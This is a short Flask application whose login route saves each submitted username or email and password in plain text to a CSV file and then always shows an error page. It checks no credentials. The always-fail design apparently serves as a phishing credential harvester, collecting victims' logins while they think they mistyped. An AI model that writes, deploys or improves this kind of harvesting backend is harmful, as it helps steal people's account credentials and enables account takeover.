from flask import Flask, render_template, request
import csv

app = Flask(__name__)

# CSV file path
csv_file_path = 'form_data.csv'

@app.route('/')
def index():
    return render_template('file2.html')

@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        username_or_email = request.form['username_or_email']
        password = request.form['password']

        # Write form data to a CSV file
        with open(csv_file_path, mode='a', newline='') as csv_file:
            fieldnames = ['Username/Email', 'Password']
            writer = csv.DictWriter(csv_file, fieldnames=fieldnames)

            # Check if the CSV file is empty and write header if needed
            if csv_file.tell() == 0:
                writer.writeheader()

            writer.writerow({'Username/Email': username_or_email, 'Password': password})

        # Redirect or respond as needed
        return render_template("error.html")

if __name__ == '__main__':
    app.run(debug=True)
